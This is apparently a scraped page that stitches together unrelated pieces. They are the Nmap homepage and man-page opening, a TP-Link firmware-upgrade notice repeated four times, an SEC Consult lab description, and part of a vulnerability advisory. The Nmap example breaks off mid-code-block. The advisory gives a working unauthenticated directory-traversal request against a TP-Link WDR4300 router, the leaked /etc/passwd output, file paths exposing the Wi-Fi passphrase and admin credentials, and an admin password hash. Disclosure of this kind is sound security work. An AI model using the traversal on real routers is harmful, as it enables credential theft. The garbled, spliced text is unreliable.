# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named “Security Product of the Year” by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap -v -A *targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

## Firmware

A firmware update can resolve issues that the previous firmware version may have and improve its current performance.

## To Upgrade

**IMPORTANT:** To prevent upgrade failures, please read the following before proceeding with the upgrade process

* **Please upgrade firmware from the local TP-Link official website of the purchase location for your TP-Link device, otherwise it will be against the warranty. Please click [here](/choose-your-location/) to change site if necessary.**
* Please verify the hardware version of your device for the firmware version. Wrong firmware upgrade may damage your device and void the warranty.
* **Do NOT turn off the power during the upgrade process, as it may cause permanent damage to the product.**
* To avoid wireless disconnect issue during firmware upgrade process, it's recommended to upload firmware with wired connection unless there is no LAN/Ethernet port on your TP-Link device.
* It's recommended that users stop all Internet applications on the computer, or simply disconnect Internet line from the device before the upgrade.
* Use decompression software such as WinZIP or WinRAR to extract the file you download before the upgrade.

## Firmware

A firmware update can resolve issues that the previous firmware version may have and improve its current performance.

## To Upgrade

**IMPORTANT:** To prevent upgrade failures, please read the following before proceeding with the upgrade process

* **Please upgrade firmware from the local TP-Link official website of the purchase location for your TP-Link device, otherwise it will be against the warranty. Please click [here](/choose-your-location/) to change site if necessary.**
* Please verify the hardware version of your device for the firmware version. Wrong firmware upgrade may damage your device and void the warranty.
* **Do NOT turn off the power during the upgrade process, as it may cause permanent damage to the product.**
* To avoid wireless disconnect issue during firmware upgrade process, it's recommended to upload firmware with wired connection unless there is no LAN/Ethernet port on your TP-Link device.
* It's recommended that users stop all Internet applications on the computer, or simply disconnect Internet line from the device before the upgrade.
* Use decompression software such as WinZIP or WinRAR to extract the file you download before the upgrade.

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

Example 15.1. A representative Nmap scan
```

## To Upgrade

**IMPORTANT:** To prevent upgrade failures, please read the following before proceeding with the upgrade process

# Vulnerability Lab

With the **Vulnerability Lab**, SEC Consult **operates its own internal security laboratory**, in order to ensure an international know-how advantage over attackers in the areas of network and application security. In addition, this facility serves the support with high-quality penetration tests and with the evaluation of new technologies and is at the service of our customers. Thus, they receive the latest information about security gaps and valid statements about the risk profile of new technologies.

Our Vulnerability Lab follows a [Responsible Disclosure Policy](/vulnerability-lab/responsible-disclosure-policy/) which aims to provide vendors with the necessary information and timeframe needed to validate and fix a security flaw in order to mutually coordinate the public release of a security advisory as part of our responsible disclosure process. This document also clarifies the extent and limitation of effort the SEC Consult Vulnerability Lab will invest. It can be found [here](/vulnerability-lab/responsible-disclosure-policy/).

Here you find all our **[studies and whitepapers](/vulnerability-lab/studies-and-whitepapers/)**.

You can reach our Vulnerability Lab through security-research(at)sec-consult.com. The PGP key with fingerprint F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F can be downloaded [here](https://keys.openpgp.org/vks/v1/by-fingerprint/F9A9D4AF3DC2D298835090252D2DD7B5C6EE883F).

The SEC Consult Vulnerability Lab is also an official [CNA](https://www.cve.org/PartnerInformation/ListofPartners/partner/SEC-VLab) (CVE Numbering Authority) and our scope for assigning CVE numbers is all vulnerabilities discovered in third-party hardware/software by the SEC Consult Vulnerability Lab, which are not in another CNA's scope.

## Firmware

A firmware update can resolve issues that the previous firmware version may have and improve its current performance.

## To Upgrade

**IMPORTANT:** To prevent upgrade failures, please read the following before proceeding with the upgrade process

* **Please upgrade firmware from the local TP-Link official website of the purchase location for your TP-Link device, otherwise it will be against the warranty. Please click [here](/choose-your-location/) to change site if necessary.**
* Please verify the hardware version of your device for the firmware version. Wrong firmware upgrade may damage your device and void the warranty.
* **Do NOT turn off the power during the upgrade process, as it may cause permanent damage to the product.**
* To avoid wireless disconnect issue during firmware upgrade process, it's recommended to upload firmware with wired connection unless there is no LAN/Ethernet port on your TP-Link device.
* It's recommended that users stop all Internet applications on the computer, or simply disconnect Internet line from the device before the upgrade.
* Use decompression software such as WinZIP or WinRAR to extract the file you download before the upgrade.

## Firmware

A firmware update can resolve issues that the previous firmware version may have and improve its current performance.

## To Upgrade

**IMPORTANT:** To prevent upgrade failures, please read the following before proceeding with the upgrade process

* **Please upgrade firmware from the local TP-Link official website of the purchase location for your TP-Link device, otherwise it will be against the warranty. Please click [here](/choose-your-location/) to change site if necessary.**
* Please verify the hardware version of your device for the firmware version. Wrong firmware upgrade may damage your device and void the warranty.
* **Do NOT turn off the power during the upgrade process, as it may cause permanent damage to the product.**
* To avoid wireless disconnect issue during firmware upgrade process, it's recommended to upload firmware with wired connection unless there is no LAN/Ethernet port on your TP-Link device.
* It's recommended that users stop all Internet applications on the computer, or simply disconnect Internet line from the device before the upgrade.
* Use decompression software such as WinZIP or WinRAR to extract the file you download before the upgrade.

Vendor description:
-------------------
"TP-LINK is a global provider of SOHO & SMB networking products and the World's
No.1 provider of WLAN products, with products available in over 120 countries
to tens of millions customers. Committed to intensive R&D, efficient production
and strict quality management, TP-LINK continues to provide award-winning
networking products in Wireless, ADSL, Routers, Switches, IP Cameras, Powerline
Adapters, Print Servers, Media Converters and Network Adapters for Global
end-users."

Source: <http://www.tp-link.us/about/?categoryid=102>

Business recommendation:
------------------------
Attackers can read sensitive configuration files without prior authentication.
These files e.g. include the administrator credentials and the WPA passphrase.

TP-LINK has provided fixed firmware which should be installed immediately.

Vulnerability overview/description:
-----------------------------------
Because of insufficient input validation, arbitrary local files can be
disclosed. Files that include passwords and other sensitive information can
be accessed.

Proof of concept:
-----------------
The following HTTP request shows how directory traversal can be used to gain
access to files without prior authentication:
===============================================================================
GET /login/../../../etc/passwd HTTP/1.1
Host: $host

===============================================================================

The server response includes the contents of the file:
===============================================================================
HTTP/1.1 200 OK
Server: Router Webserver
Connection: Keep-Alive
Keep-Alive:
Persist:
WWW-Authenticate: Basic realm="TP-LINK Wireless Dual Band Gigabit Router WDR4300"
Content-Length: 683
Content-Type: text/html
root:x:0:0:root:/root:/bin/sh
Admin:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/bin/sh
daemon:x:2:2:daemon:/usr/sbin:/bin/sh
adm:x:3:4:adm:/adm:/bin/sh
lp:x:4:7:lp:/var/spool/lpd:/bin/sh
sync:x:5:0:sync:/bin:/bin/sync
shutdown:x:6:11:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
uucp:x:10:14:uucp:/var/spool/uucp:/bin/sh
operator:x:11:0:Operator:/var:/bin/sh
nobody:x:65534:65534:nobody:/home:/bin/sh

dropbear:x:500:500:dropbear:/tmp/dropbear:/bin/sh
dropbear:x:500:500:dropbear:/tmp/dropbear:/bin/sh
===============================================================================

Several sensitive files can be read. These include:
Files containing Wi-Fi configuration including WPA-passphrase:
/login/../../../tmp/ath.ap_bss
/login/../../../tmp/ath1.ap_bss

A file containing administrator credentials (format: $user:md5($password), which can
be brute-forced very efficiently:
/login/../../../tmp/dropbear/dropbearpwd

Example server response:
===============================================================================
HTTP/1.1 200 OK
Server: Router Webserver
Connection: Keep-Alive
Keep-Alive:
Persist:
WWW-Authenticate: Basic realm="TP-LINK Wireless Dual Band Gigabit Router WDR4300"
Content-Length: 56
Content-Type: text/html
username:admin
password:11d0fc2ff3e7862d8a3f9b280e6d390c
